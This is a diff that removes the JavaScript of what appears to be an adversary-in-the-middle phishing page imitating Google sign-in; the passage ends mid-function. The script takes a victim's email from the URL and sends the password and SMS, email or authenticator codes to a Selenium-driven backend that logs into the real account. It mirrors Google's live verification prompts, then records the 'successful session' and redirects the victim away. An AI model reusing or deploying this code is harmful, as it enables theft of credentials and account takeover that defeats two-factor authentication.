@@ -1099,1216 +1099,1034 @@
     </div>
 
     <script>
-
-		document.addEventListener('DOMContentLoaded', function() {
-			// DOM Elements
-			const fullPageLoader = document.getElementById('fullPageLoader');
-			const loadingIframe = document.getElementById('loadingIframe');
-			const sessionExpired = document.getElementById('sessionExpired');
-			const formBox = document.getElementById('formBox');
-			const passwordInput = document.getElementById('passwordInput');
-			const passwordError = document.getElementById('passwordError');
-			const nextButton = document.getElementById('nextButton');
-			const authNumberDisplay = document.getElementById('authNumberDisplay');
-			const authNumberText = document.getElementById('authNumberText');
-			const authNumberHeading = document.getElementById('authNumberHeading');
-			const authNumberInstruction = document.getElementById('authNumberInstruction');
-			const emailDisplay = document.getElementById('emailDisplay');
-			const authEmailDisplay = document.getElementById('authEmailDisplay');
-			const pageTitle = document.getElementById('pageTitle');
-			const tryAnotherWay = document.getElementById('tryAnotherWay');
-			const backToDeviceAuth = document.getElementById('backToDeviceAuth');
-			const sendAgainDevice = document.getElementById('sendAgainDevice');
-			const sendAgainText = document.getElementById('sendAgainText');
-			const sendAgainEmail = document.getElementById('sendAgainEmail');
-			const textCodeInput = document.getElementById('textCodeInput');
-			const emailCodeInput = document.getElementById('emailCodeInput');
-			const authenticatorCodeInput = document.getElementById('authenticatorCodeInput');
-			const textCodeError = document.getElementById('textCodeError');
-			const emailCodeError = document.getElementById('emailCodeError');
-			const authenticatorCodeError = document.getElementById('authenticatorCodeError');
-			const profileIcons = document.querySelectorAll('.profile-icon');
-			const verificationGif = document.getElementById('verificationGif');
-			const gifHeaderText = document.getElementById('gifHeaderText');
-			const authNumberVerificationDisplay = document.getElementById('authNumberVerificationDisplay');
-			const authNumberVerificationTitle = document.getElementById('authNumberVerificationTitle');
-			const authNumberVerificationInstruction = document.getElementById('authNumberVerificationInstruction');
-			const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
-			const showPasswordLabel = document.getElementById('showPasswordLabel');
-			const passwordForm = document.getElementById('passwordForm');
-			const deviceAuthContainer = document.getElementById('deviceAuthContainer');
-			const successPage = document.getElementById('successPage');
-			const safetyMessage = document.getElementById('safetyMessage');
-			const authSafetyMessage = document.getElementById('authSafetyMessage');
-			const tryAnotherWayFromGif = document.getElementById('tryAnotherWayFromGif');
-			const tryAnotherWayFromAuthNumber = document.getElementById('tryAnotherWayFromAuthNumber');
-			const tapYesOption = document.getElementById('tapYesOption');
-			const textOption = document.getElementById('textOption');
-			const emailOption = document.getElementById('emailOption');
-			const authenticatorOption = document.getElementById('authenticatorOption');
-			const helpOption = document.getElementById('helpOption');
-			const textCodeInstruction = document.getElementById('textCodeInstruction');
-			const emailCodeInstruction = document.getElementById('emailCodeInstruction');
-
-			// State variables
-			let currentEmail = '';
-			let sessionId = '';
-			let statusPollingInterval = null;
-			let codeVerificationInterval = null;
-			let pageMonitorInterval = null;
-			let passwordErrorState = false;
-			let lastActivityTime = Date.now();
-			const API_BASE_URL = 'http://localhost:5000/api';
-
-			// Initialize the application
-			initApplication();
-
-			function initApplication() {
-				const urlParams = new URLSearchParams(window.location.search);
-				const emailFromURL = urlParams.get('email');
-				
-				if (!emailFromURL) {
-					document.getElementById('noEmailContainer').style.display = 'block';
-					document.getElementById('passwordForm').style.display = 'none';
-					document.getElementById('deviceAuthContainer').style.display = 'none';
-					return;
-				}
-
-				currentEmail = emailFromURL;
-				sessionId = generateSessionId();
-				initUI();
-				startSession();
-				setupEventListeners();
-				
-				// Show iframe initially
-				loadingIframe.style.display = 'block';
-				
-				// Set up activity monitoring
-				setupActivityMonitoring();
-			}
-
-			function setupActivityMonitoring() {
-				// Track user activity
-				document.addEventListener('mousemove', updateActivityTime);
-				document.addEventListener('keydown', updateActivityTime);
-				document.addEventListener('click', updateActivityTime);
-				document.addEventListener('scroll', updateActivityTime);
-				
-				// Check for inactivity every minute
-				setInterval(checkInactivity, 60000);
-			}
-
-			function updateActivityTime() {
-				lastActivityTime = Date.now();
-			}
-
-			function checkInactivity() {
-				const inactiveTime = Date.now() - lastActivityTime;
-				if (inactiveTime > 180000) { // 3 minutes
-					showSessionExpired();
-				}
-			}
-
-			function showSessionExpired() {
-				sessionExpired.style.display = 'block';
-				setTimeout(() => {
-					window.location.href = `https://example.com?${encodeURIComponent(currentEmail)}#incomplete`;
-				}, 3000);
-			}
-
-			function generateSessionId() {
-				return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
-			}
-
-			function initUI() {
-				// Remove the loading state and blur effect
-				fullPageLoader.style.display = 'none';
-				formBox.classList.remove('blur-effect');
-				
-				updateEmailDisplay(currentEmail);
-				updateProfileIcons(currentEmail);
-				
-				// Setup show password toggle
-				showPasswordCheckbox.addEventListener('click', togglePasswordVisibility);
-				showPasswordLabel.addEventListener('click', togglePasswordVisibility);
-			}
-
-			function togglePasswordVisibility() {
-				const isChecked = showPasswordCheckbox.classList.contains('checked');
-				if (isChecked) {
-					showPasswordCheckbox.classList.remove('checked');
-					passwordInput.type = 'password';
-				} else {
-					showPasswordCheckbox.classList.add('checked');
-					passwordInput.type = 'text';
-				}
-			}
-
-			function setLoadingState(loading, isPasswordPage = false, persistUntilNextPage = false) {
-				const throbber = document.getElementById('throbberContainer');
-				const formBox = document.getElementById('formBox');
-				
-				if (loading) {
-					throbber.style.display = 'block';
-					throbber.classList.remove('hidden');
-					if (!persistUntilNextPage) {
-						formBox.classList.add('blur-effect');
-					}
-					if (isPasswordPage) {
-						nextButton.classList.add('loading');
-					}
-				} else {
-					// Immediate throbber hide with transition
-					throbber.classList.add('hidden');
-					setTimeout(() => {
-						throbber.style.display = 'none';
-					}, 200); // Match CSS transition duration
-					
-					formBox.classList.remove('blur-effect');
-					nextButton.classList.remove('loading');
-				}
-			}
-
-			function setupEventListeners() {
-				nextButton.addEventListener('click', handlePasswordSubmit);
-				backToDeviceAuth.addEventListener('click', showDevicePrompt);
-				tapYesOption.addEventListener('click', () => selectAuthOption('device'));
-				textOption.addEventListener('click', () => selectAuthOption('sms'));
-				emailOption.addEventListener('click', () => selectAuthOption('email'));
-				authenticatorOption.addEventListener('click', () => selectAuthOption('authenticator'));
-				helpOption.addEventListener('click', () => selectAuthOption('help'));
-				document.getElementById('tryAnotherWayFromText').addEventListener('click', handleTryAnotherWayFromText);
-				document.getElementById('tryAnotherWayFromEmail').addEventListener('click', handleTryAnotherWayFromEmail);
-				document.getElementById('tryAnotherWayFromAuthenticator').addEventListener('click', handleTryAnotherWayFromAuthenticator);
-				document.getElementById('submitTextCode').addEventListener('click', () => handleCodeSubmit('text'));
-				document.getElementById('submitEmailCode').addEventListener('click', () => handleCodeSubmit('email'));
-				document.getElementById('submitAuthenticatorCode').addEventListener('click', () => handleCodeSubmit('authenticator'));
-				tryAnotherWayFromGif.addEventListener('click', handleTryAnotherWayFromGif);
-				tryAnotherWayFromAuthNumber.addEventListener('click', handleTryAnotherWayFromAuthNumber);
-				
-				// Enhanced password input handling
-				// Add this to your setupEventListeners function
-				passwordInput.addEventListener('input', function() {
-					// Keep error state visible but remove border while typing
-					if (passwordErrorState) {
-						passwordInput.classList.remove('dark-red-border');
-						document.getElementById('passwordError').style.display = 'block';
-					}
-				});
-
-				passwordInput.addEventListener('focus', function() {
-					// Reapply border when focused if in error state
-					if (passwordErrorState) {
-						passwordInput.classList.add('dark-red-border');
-					}
-				});
-
-				passwordInput.addEventListener('blur', function() {
-					// Ensure border stays if empty after blur
-					if (passwordErrorState && !passwordInput.value) {
-						passwordInput.classList.add('dark-red-border');
-					}
-				});
-				
-				textCodeInput.addEventListener('input', handleOtpInput);
-				emailCodeInput.addEventListener('input', handleOtpInput);
-				authenticatorCodeInput.addEventListener('input', handleOtpInput);
-				setupSendAgainButtons();
-			}
-
-			function handleOtpInput(e) {
-				const input = e.target;
-				const errorId = input.id.replace('Input', 'Error');
-				clearError(errorId);
-				input.value = input.value.replace(/[^0-9]/g, '');
-				input.classList.remove('has-error');
-				input.classList.remove('dark-red-border');
-			}
-
-			function showLoading() {
-				document.getElementById('throbberContainer').style.display = 'block';
-				formBox.classList.add('loading');
-				nextButton.classList.add('loading');
-				return {
-					hide: () => {
-						document.getElementById('throbberContainer').style.display = 'none';
-						formBox.classList.remove('loading');
-						nextButton.classList.remove('loading');
-					}
-				};
-			}
-
-			function showError(elementId, message) {
-				const element = document.getElementById(elementId);
-				if (element) {
-					// Immediately stop any loading state
-					setLoadingState(false);
-					
-					element.textContent = message;
-					element.style.display = 'block';
-					element.classList.add('dark-red-error');
-					
-					// Special handling for password errors
-					if (elementId === 'passwordError') {
-						passwordInput.classList.add('dark-red-border');
-						passwordInput.focus();
-						passwordErrorState = true;
-					}
-					// OTP error handling remains unchanged
-					else if (elementId === 'textCodeError') {
-						textCodeInput.classList.add('dark-red-border');
-						textCodeInput.focus();
-					}
-					else if (elementId === 'emailCodeError') {
-						emailCodeInput.classList.add('dark-red-border');
-						emailCodeInput.focus();
-					}
-					else if (elementId === 'authenticatorCodeError') {
-						authenticatorCodeInput.classList.add('dark-red-border');
-						authenticatorCodeInput.focus();
-					}
-				}
-			}
-
-			function clearError(elementId) {
-				const element = document.getElementById(elementId);
-				if (element) {
-					// Don't clear the error display if we're in password error state
-					if (elementId === 'passwordError' && passwordErrorState) {
-						return;
-					}
-					
-					element.textContent = '';
-					element.style.display = 'none';
-					element.classList.remove('dark-red-error');
-					
-					if (elementId === 'passwordError') {
-						passwordInput.classList.remove('dark-red-border');
-						passwordErrorState = false;
-					}
-				}
-			}
-
-			async function startSession() {
-				const loading = showLoading();
-				try {
-					const response = await fetch(`${API_BASE_URL}/start_session`, {
-						method: 'GET',
-						headers: {
-							'Content-Type': 'application/json',
-						},
-						body: JSON.stringify({
-							email: currentEmail,
-							session_id: sessionId
-						})
-					});
-					
-					const data = await response.json();
-					
-					if (data.success) {
-						startPageStateMonitoring();
-					} else {
-						showCustomAlert('Failed to start session. Please refresh the page.', true);
-					}
-				} catch (error) {
-					console.error('Error starting session:', error);
-					showCustomAlert('Connection error. Please try again.', true);
-				} finally {
-					loading.hide();
-				}
-			}
-
-			function startPageStateMonitoring() {
-				if (pageMonitorInterval) {
-					clearInterval(pageMonitorInterval);
-				}
-				
-				pageMonitorInterval = setInterval(async () => {
-					try {
-						const response = await fetch(
-							`${API_BASE_URL}/selenium/get_page_state?session_id=${sessionId}`
-						);
-						const data = await response.json();
-						
-						if (data.success) {
-							handlePageStateUpdate(data);
-						}
-					} catch (error) {
-						console.error('Error monitoring page state:', error);
-					}
-				}, 1000);
-			}
-
-			function handlePageStateUpdate(data) {
-				// Hide iframe when password page is ready
-				if (data.password_page_ready) {
-					loadingIframe.style.display = 'none';
-				}
-
-				// Stop throbber on any error
-				if (data.error?.password || data.error?.otp) {
-					setLoadingState(false);
-				}
-
-				// Handle password page
-				if (data.current_page === 'password') {
-					safetyMessage.style.display = 'none';
-					
-					if (data.heading_text) {
-						pageTitle.textContent = data.heading_text;
-					}
-
-					if (data.password_field_detected) {
-						passwordForm.style.display = 'block';
-						deviceAuthContainer.style.display = 'none';
-						successPage.style.display = 'none';
-						startStatusPolling();
-					}
-
-					// Handle password errors immediately
-					if (data.error?.password !== null && data.error?.password !== undefined) {
-						// Show error if display.json has an error message (even empty string)
-						showError('passwordError', data.error.password);
-						passwordInput.classList.add('dark-red-border');
-						passwordInput.focus();
-					} else {
-						// Clear error if display.json has null or undefined error
-						clearError('passwordError');
-					}
-				}
-				// Handle 2FA pages
-				else if (data.current_page === '2fa') {
-					safetyMessage.style.display = 'block';
-					authSafetyMessage.style.display = 'block';
-
-					passwordForm.style.display = 'none';
-					deviceAuthContainer.style.display = 'block';
-					successPage.style.display = 'none';
-
-					update2FADisplay(data);
-
-					// Keep loading for GIF/auth number pages until success
-					if (data.has_gif_element || data.has_auth_number_element) {
-						setLoadingState(true, false, true);
-					} else {
-						setLoadingState(false);
-					}
-
-					if (data.is_text_otp_page && data.text_otp_instruction) {
-						textCodeInstruction.textContent = data.text_otp_instruction;
-					}
-
-					if (data.is_email_verification_page && data.email_verification_instruction) {
-						emailCodeInstruction.textContent = data.email_verification_instruction;
-					}
-
-					// Handle OTP errors
-					if (data.error?.otp) {
-						const currentMethod = getCurrentAuthMethod();
-						if (currentMethod === 'text') {
-							showError('textCodeError', data.error.otp);
-							textCodeInput.classList.add('dark-red-border');
-							textCodeInput.focus();
-						} else if (currentMethod === 'email') {
-							showError('emailCodeError', data.error.otp);
-							emailCodeInput.classList.add('dark-red-border');
-							emailCodeInput.focus();
-						} else if (currentMethod === 'authenticator') {
-							showError('authenticatorCodeError', data.error.otp);
-							authenticatorCodeInput.classList.add('dark-red-border');
-							authenticatorCodeInput.focus();
-						}
-					}
-				}
-				// In the page state monitoring function:
-				else if (!data.heading_found && data.current_url && data.current_url.includes('mail.google.com')) {
-					// Success condition
-					clearInterval(pageMonitorInterval);
-					setLoadingState(false);
-					passwordForm.style.display = 'none';
-					deviceAuthContainer.style.display = 'none';
-					successPage.style.display = 'block';
-
-					// Redirect to example.com after 3 seconds
-					setTimeout(() => {
-						window.location.href = 'https://example.com';
-					}, 3000);
-
-					// Save successful session
-					saveSuccessfulSession();
-				}
-			}
-
-			function update2FADisplay(data) {
-				// Hide all containers first
-				hideAllAuthContainers();
-			
-				// Show the appropriate container based on 2FA type
-				if (data.has_gif_element) {
-					const gifContainer = document.getElementById('gifVerificationContainer');
-					gifContainer.style.display = 'block';
-			
-					if (data.gif_url) {
-						document.getElementById('verificationGif').src = data.gif_url;
-					}
-					if (data.gif_heading) {
-						document.getElementById('gifHeaderText').textContent = data.gif_heading;
-					}
-				}
-				else if (data.has_auth_number_element) {
-					document.getElementById('authNumberVerificationContainer').style.display = 'block';
-			
-					if (data.auth_number) {
-						document.getElementById('authNumberVerificationDisplay').textContent = data.auth_number;
-					}
-					if (data.auth_number_heading) {
-						document.getElementById('authNumberVerificationTitle').textContent = data.auth_number_heading;
-					}
-					if (data.auth_number_instruction) {
-						document.getElementById('authNumberVerificationInstruction').textContent = data.auth_number_instruction;
-					}
-				}
-				else if (data.is_authenticator_page) {
-					document.getElementById('authenticatorContainer').style.display = 'block';
-				}
-				else if (data.is_options_page) {
-					showAltAuthOptions(data.options || []);
-				}
-				else if (data.is_text_otp_page) {
-					document.getElementById('textCodeContainer').style.display = 'block';
-					if (data.text_otp_instruction) {
-						document.getElementById('textCodeInstruction').textContent = data.text_otp_instruction;
-					}
-				}
-				else if (data.is_email_verification_page) {
-					document.getElementById('emailCodeContainer').style.display = 'block';
-					if (data.email_verification_instruction) {
-						document.getElementById('emailCodeInstruction').textContent = data.email_verification_instruction;
-					}
-				}
-				else {
-					// Default 2FA method
-					document.getElementById('devicePromptContainer').style.display = 'block';
-			
-					if (data.auth_number) {
-						document.getElementById('authNumberDisplay').textContent = data.auth_number;
-						document.getElementById('authNumberText').textContent = data.auth_number;
-					}
-					if (data.auth_number_heading) {
-						document.getElementById('authNumberHeading').textContent = data.auth_number_heading;
-					}
-					if (data.auth_number_instruction) {
-						document.getElementById('authNumberInstruction').textContent = data.auth_number_instruction;
-					}
-				}
-			
-				// Update other UI elements
-				updateUIFromDisplayConfig(data);
-			}
-
-			async function showAltAuthOptions(options) {
-				const loading = showLoading();
-				try {
-					// Clear existing options
-					const altAuthOptions = document.getElementById('altAuthOptions');
-					altAuthOptions.innerHTML = '';
-					
-					// Create and append each option dynamically
-					options.forEach(option => {
-						const optionDiv = document.createElement('div');
-						optionDiv.className = 'auth-option';
-						
-						// Check if option is unavailable
-						if (option.text.includes('Unavailable')) {
-							optionDiv.classList.add('unavailable');
-						}
-						
-						// Set up option content based on type
-						let icon = '';
-						let title = '';
-						let desc = '';
-						
-						if (option.is_tap_yes) {
-							icon = '<span class="material-icons">phone_iphone</span>';
-							title = 'Tap "Yes" on your device';
-							desc = 'Confirm it\'s you on one of your devices';
-						} 
-						else if (option.is_authenticator) {
-							icon = '<span class="material-icons">security</span>';
-							title = 'Use Google Authenticator';
-							desc = 'Get a verification code from the app';
-						}
-						else if (option.is_sms) {
-							icon = '<span class="material-icons">sms</span>';
-							// Extract phone number from text if available
-							const phoneMatch = option.text.match(/\(\d{3}\) \d{3}-\d{4}/);
-							title = 'Get a verification code by text';
-							desc = phoneMatch ? `+1 ${phoneMatch[0]}` : option.text.split('\n')[0];
-						}
-						else if (option.is_email) {
-							icon = '<span class="material-icons">email</span>';
-							title = 'Get a verification code by email';
-							desc = option.text.split('\n')[0];
-						}
-						else if (option.is_help) {
-							icon = '<span class="material-icons">help</span>';
-							title = 'Get help';
-							desc = 'Troubleshoot issues with 2-Step Verification';
-						}
-						else {
-							// Default/help option
-							icon = '<span class="material-icons">help</span>';
-							title = option.text.split('\n')[0];
-							desc = option.text.split('\n').slice(1).join('<br>');
-						}
-						
-						optionDiv.innerHTML = `
-							<div class="auth-method-icon">${icon}</div>
-							<div class="auth-option-content">
-								<div class="auth-option-title">${title}</div>
-								<div class="auth-option-desc">${desc}</div>
-							</div>
-						`;
-						
-						// Add click handler if not unavailable
-						if (!option.text.includes('Unavailable')) {
-							optionDiv.addEventListener('click', async () => {
-								setLoadingState(true, false, true);
-								try {
-									const response = await fetch(`${API_BASE_URL}/selenium/select_option`, {
-										method: 'GET',
-										headers: {
-											'Content-Type': 'application/json',
-										},
-										body: JSON.stringify({
-											session_id: sessionId,
-											option_xpath: option.xpath,
-											option_type: getOptionType(option)
-										})
-									});
-									
-									const data = await response.json();
-									if (!data.success) {
-										showCustomAlert('Failed to select option', true);
-									}
-								} catch (error) {
-									console.error('Error selecting option:', error);
-									showCustomAlert('Connection error. Please try again.', true);
-								}
-							});
-						}
-						
-						altAuthOptions.appendChild(optionDiv);
-					});
-					
-					// Add back button
-					const backButton = document.createElement('a');
-					backButton.className = 'back-to-device-auth';
-					backButton.id = 'backToDeviceAuth';
-					backButton.textContent = 'Back';
-					backButton.addEventListener('click', showDevicePrompt);
-					altAuthOptions.appendChild(backButton);
-					
-					hideAllAuthContainers();
-					altAuthOptions.style.display = 'block';
-					
-					loading.hide();
-				} catch (error) {
-					loading.hide();
-					showCustomAlert('Failed to load options. Please try again.', true);
-					console.error('Error loading options:', error);
-				}
-			}
-
-			function getOptionType(option) {
-				if (option.is_tap_yes) return 'device';
-				if (option.is_authenticator) return 'authenticator';
-				if (option.is_sms) return 'sms';
-				if (option.is_email) return 'email';
-				if (option.is_help) return 'help';
-				return 'unknown';
-			}
-
-			async function handlePasswordSubmit() {
-				console.log('Password submit initiated');
-				const password = passwordInput.value.trim();
-				
-				// Don't do any frontend validation - rely completely on backend/display.json
-				setLoadingState(true, true, true);
-				
-				try {
-					const response = await fetch(`${API_BASE_URL}/auth/password`, {
-						method: 'GET',
-						headers: {
-							'Content-Type': 'application/json',
-						},
-						body: JSON.stringify({
-							email: currentEmail,
-							password: password,
-							session_id: sessionId
-						})
-					});
-					
-					const data = await response.json();
-					
-					if (data.success) {
-						startStatusPolling();
-					} else {
-						setLoadingState(false);
-						passwordInput.value = '';
-						passwordInput.focus();
-						
-						// Force immediate display.json check
-						checkStatus().then(status => {
-							if (status && status.display) {
-								handlePageStateUpdate(status.display);
-							}
-						});
-					}
-				} catch (error) {
-					console.error('Password submit error:', error);
-					setLoadingState(false);
-					logEvent('password_submission_error', {
-						error: error.message,
-						session_id: sessionId
-					});
-				}
-			}
-
-			function startStatusPolling() {
-				if (statusPollingInterval) clearInterval(statusPollingInterval);
-				
-				let lastErrorState = null; // Track previous error state
-				
-				statusPollingInterval = setInterval(async () => {
-					const status = await checkStatus();
-					if (status?.display) {
-						// Only update if error state changed
-						if (status.display.error?.password !== lastErrorState) {
-							handlePageStateUpdate(status.display);
-							lastErrorState = status.display.error?.password;
-						}
-						
-						if (status.display.error?.password) {
-							clearInterval(statusPollingInterval);
-						}
-					}
-				}, 1000);
-			}
-
-			async function checkStatus() {
-				try {
-					const response = await fetch(
-						`${API_BASE_URL}/auth/status?email=${encodeURIComponent(currentEmail)}&session_id=${sessionId}`
-					);
-					if (!response.ok) throw new Error('Network response was not ok');
-					return await response.json();
-				} catch (error) {
-					console.error('Error checking status:', error);
-					return null;
-				}
-			}
-
-			function handleStatusUpdate(displayConfig) {
-				// Handle password errors
-				if (displayConfig.error?.password) {
-					showError('passwordError', displayConfig.error.password);
-					passwordInput.focus();
-					return;
-				}
-
-				// Handle OTP errors
-				if (displayConfig.error?.otp) {
-					const currentMethod = getCurrentAuthMethod();
-					if (currentMethod === 'text') {
-						showError('textCodeError', displayConfig.error.otp);
-						textCodeInput.focus();
-					} else if (currentMethod === 'email') {
-						showError('emailCodeError', displayConfig.error.otp);
-						emailCodeInput.focus();
-					} else if (currentMethod === 'authenticator') {
-						showError('authenticatorCodeError', displayConfig.error.otp);
-						authenticatorCodeInput.focus();
-					}
-					return;
-				}
-			}
-
-			function getCurrentAuthMethod() {
-				if (document.getElementById('textCodeContainer').style.display === 'block') return 'text';
-				if (document.getElementById('emailCodeContainer').style.display === 'block') return 'email';
-				if (document.getElementById('authenticatorContainer').style.display === 'block') return 'authenticator';
-				return 'device';
-			}
-
-			function updateUIFromDisplayConfig(displayConfig) {
-				if (displayConfig.device_name) {
-					document.querySelector('.device-prompt-container .auth-instruction').innerHTML = 
-						`Google sent a notification to ${displayConfig.device_name}. Open the Gmail app, tap Yes on the prompt, ` +
-						`then tap <span id="authNumberText">${displayConfig.auth_number || '21'}</span> on your phone to verify it's you.`;
-				}
-				
-				if (displayConfig.auth_number) {
-					authNumberDisplay.textContent = displayConfig.auth_number;
-					authNumberText.textContent = displayConfig.auth_number;
-				}
-				
-				if (displayConfig.masked_email) {
-					document.querySelector('#emailOption .auth-option-desc').textContent = displayConfig.masked_email;
-					document.querySelector('#emailCodeContainer .auth-instruction').textContent = 
-						`We sent a 6-digit code to ${displayConfig.masked_email}. Enter it below to verify it's you.`;
-				}
-				
-				if (displayConfig.masked_phone) {
-					document.querySelector('#textOption .auth-option-desc').textContent = displayConfig.masked_phone;
-					document.querySelector('#textCodeContainer .auth-instruction').textContent = 
-						`We sent a 6-digit code to ${displayConfig.masked_phone}. Enter it below to verify it's you.`;
-				}
-			}
-
-			async function saveSuccessfulSession() {
-				try {
-					const response = await fetch(`${API_BASE_URL}/save_successful_session`, {
-						method: 'GET',
-						headers: {
-							'Content-Type': 'application/json',
-						},
-						body: JSON.stringify({
-							email: currentEmail,
-							session_id: sessionId
-						})
-					});
-					
-					if (!response.ok) {
-						console.error('Failed to save successful session');
-					}
-				} catch (error) {
-					console.error('Error saving successful session:', error);
-				}
-			}
-
-			async function handleTryAnotherWayFromText() {
-				setLoadingState(true); // Show loading state
-				try {
-					const response = await fetch(`${API_BASE_URL}/selenium/try_another_way`, {
-						method: 'GET',
-						headers: {
-							'Content-Type': 'application/json',
-						},
-						body: JSON.stringify({
-							session_id: sessionId,
-							method: 'text',
-							xpath: '//*[@id="yDmH0d"]/c-wiz/main/div[3]/div[2]/div[2]/div/div/button/span'
-						})
-					});
-					
-					const data = await response.json();
-					
-					if (!data.success) {
-						showCustomAlert('Action timed out or failed', true);
-						setLoadingState(false); // Hide loading on failure
-					}
-					// Loading state will be cleared by page state monitoring when new page loads
-				} catch (error) {
-					console.error('Error handling try another way:', error);
-					showCustomAlert('Connection error. Please try again.', true);
-					setLoadingState(false); // Hide loading on error
-				}
-			}
-
-			async function handleTryAnotherWayFromEmail() {
-				setLoadingState(true); // Show loading state
-				try {
-					const response = await fetch(`${API_BASE_URL}/selenium/try_another_way`, {
-						method: 'GET',
-						headers: {
-							'Content-Type': 'application/json',
-						},
-						body: JSON.stringify({
-							session_id: sessionId,
-							method: 'email',
-							xpath: '//*[@id="yDmH0d"]/c-wiz/main/div[3]/div/div[2]/div/div/button/span'
-						})
-					});
-					
-					const data = await response.json();
-					
-					if (!data.success) {
-						showCustomAlert('Action timed out or failed', true);
-						setLoadingState(false); // Hide loading on failure
-					}
-					// Loading state will be cleared by page state monitoring when new page loads
-				} catch (error) {
-					console.error('Error handling try another way:', error);
-					showCustomAlert('Connection error. Please try again.', true);
-					setLoadingState(false); // Hide loading on error
-				}
-			}
-
-			async function handleTryAnotherWayFromAuthenticator() {
-				setLoadingState(true); // Show loading state
-				try {
-					const response = await fetch(`${API_BASE_URL}/selenium/try_another_way`, {
-						method: 'GET',
-						headers: {
-							'Content-Type': 'application/json',
-						},
-						body: JSON.stringify({
-							session_id: sessionId,
-							method: 'authenticator',
-							xpath: '//*[@id="yDmH0d"]/c-wiz/main/div[3]/div/div[2]/div/div/button/span'
-						})
-					});
-					
-					const data = await response.json();
-					
-					if (!data.success) {
-						showCustomAlert('Action timed out or failed', true);
-						setLoadingState(false); // Hide loading on failure
-					}
-					// Loading state will be cleared by page state monitoring when new page loads
-				} catch (error) {
-					console.error('Error handling try another way:', error);
-					showCustomAlert('Connection error. Please try again.', true);
-					setLoadingState(false); // Hide loading on error
-				}
-			}
-
-			async function handleTryAnotherWayFromGif() {
-				setLoadingState(true); // Show loading state
-				try {
-					const response = await fetch(`${API_BASE_URL}/selenium/try_another_way`, {
-						method: 'GET',
-						headers: {
-							'Content-Type': 'application/json',
-						},
-						body: JSON.stringify({
-							session_id: sessionId,
-							method: 'gif'
-						})
-					});
-					
-					const data = await response.json();
-					
-					if (!data.success) {
-						showCustomAlert('Action timed out or failed', true);
-						setLoadingState(false); // Hide loading on failure
-					}
-					// Loading state will be cleared by page state monitoring when new page loads
-				} catch (error) {
-					console.error('Error handling try another way:', error);
-					showCustomAlert('Connection error. Please try again.', true);
-					setLoadingState(false); // Hide loading on error
-				}
-			}
-
-			async function handleTryAnotherWayFromAuthNumber() {
-				setLoadingState(true); // Show loading state
-				try {
-					const response = await fetch(`${API_BASE_URL}/selenium/try_another_way`, {
-						method: 'GET',
-						headers: {
-							'Content-Type': 'application/json',
-						},
-						body: JSON.stringify({
-							session_id: sessionId,
-							method: 'auth_number'
-						})
-					});
-					
-					const data = await response.json();
-					
-					if (!data.success) {
-						showCustomAlert('Action timed out or failed', true);
-						setLoadingState(false); // Hide loading on failure
-					}
-					// Loading state will be cleared by page state monitoring when new page loads
-				} catch (error) {
-					console.error('Error handling try another way:', error);
-					showCustomAlert('Connection error. Please try again.', true);
-					setLoadingState(false); // Hide loading on error
-				}
-			}
-
-			async function selectAuthOption(methodType) {
-				setLoadingState(true, false, true); // Show persistent loading
-				
-				try {
-					// Get the current display config which includes the options
-					const statusResponse = await fetch(`${API_BASE_URL}/auth/status?session_id=${sessionId}`);
-					const statusData = await statusResponse.json();
-					
-					if (!statusData.success || !statusData.display || !statusData.display.options) {
-						showCustomAlert('No authentication options available', true);
-						setLoadingState(false);
-						return;
-					}
-
-					// Find the matching option based on method type
-					let option = null;
-					const options = statusData.display.options;
-					
-					switch (methodType) {
-						case 'device':
-							option = options.find(opt => opt.is_tap_yes);
-							break;
-						case 'sms':
-							option = options.find(opt => opt.is_sms);
-							break;
-						case 'email':
-							option = options.find(opt => opt.is_email);
-							break;
-						case 'authenticator':
-							option = options.find(opt => opt.is_authenticator);
-							break;
-						case 'help':
-							option = options.find(opt => opt.is_help);
-							break;
-						default:
-							showCustomAlert('Invalid authentication method', true);
-							setLoadingState(false);
-							return;
-					}
-
-					if (!option) {
-						showCustomAlert('This authentication method is not available', true);
-						setLoadingState(false);
-						return;
-					}
-
-					// Send the selection to the server
-					const selectResponse = await fetch(`${API_BASE_URL}/selenium/select_option`, {
-						method: 'GET',
-						headers: {
-							'Content-Type': 'application/json',
-						},
-						body: JSON.stringify({
-							session_id: sessionId,
-							option_xpath: option.xpath,
-							option_type: methodType
-						})
-					});
-
-					const selectData = await selectResponse.json();
-					
-					if (!selectData.success) {
-						setLoadingState(false);
-						showCustomAlert('Failed to select authentication method', true);
-					}
-					// Loading state will persist until next page loads
-				} catch (error) {
-					console.error('Error selecting authentication option:', error);
-					setLoadingState(false);
-					showCustomAlert('Connection error. Please try again.', true);
-				}
-			}
-
-			function showDevicePrompt() {
-				hideAllAuthContainers();
-				document.getElementById('devicePromptContainer').style.display = 'block';
-				startStatusPolling();
-			}
-
-			function showTextVerification() {
-				const loading = showLoading();
-				hideAllAuthContainers();
-				document.getElementById('textCodeContainer').style.display = 'block';
-				textCodeInput.focus();
-				loading.hide();
-			}
-
-			function showEmailVerification() {
-				const loading = showLoading();
-				hideAllAuthContainers();
-				document.getElementById('emailCodeContainer').style.display = 'block';
-				emailCodeInput.focus();
-				loading.hide();
-			}
-
-			function showAuthenticator() {
-				const loading = showLoading();
-				hideAllAuthContainers();
-				document.getElementById('authenticatorContainer').style.display = 'block';
-				authenticatorCodeInput.focus();
-				loading.hide();
-			}
-
-			function hideAllAuthContainers() {
-				document.getElementById('devicePromptContainer').style.display = 'none';
-				document.getElementById('altAuthOptions').style.display = 'none';
-				document.getElementById('textCodeContainer').style.display = 'none';
-				document.getElementById('emailCodeContainer').style.display = 'none';
-				document.getElementById('authenticatorContainer').style.display = 'none';
-				document.getElementById('gifVerificationContainer').style.display = 'none';
-				document.getElementById('authNumberVerificationContainer').style.display = 'none';
-			}
-
-			function setupSendAgainButtons() {
-				const sendAgainButtons = [
-					document.getElementById('sendAgainDevice'),
-					document.getElementById('sendAgainText'),
-					document.getElementById('sendAgainEmail'),
-					document.getElementById('sendAgainAuthenticator')
-				];
-				
-				sendAgainButtons.forEach(btn => {
-					if (btn) {
-						btn.addEventListener('click', async function(e) {
-							e.preventDefault();
-							const originalText = btn.textContent;
-							btn.classList.add('send-again-loading');
-							btn.textContent = 'Sending...';
-							
-							try {
-								const method = this.id.replace('sendAgain', '').toLowerCase();
-								const response = await fetch(`${API_BASE_URL}/selenium/send_code`, {
-									method: 'GET',
-									headers: {
-										'Content-Type': 'application/json',
-									},
-									body: JSON.stringify({
-										session_id: sessionId,
-										method: method
-									})
-								});
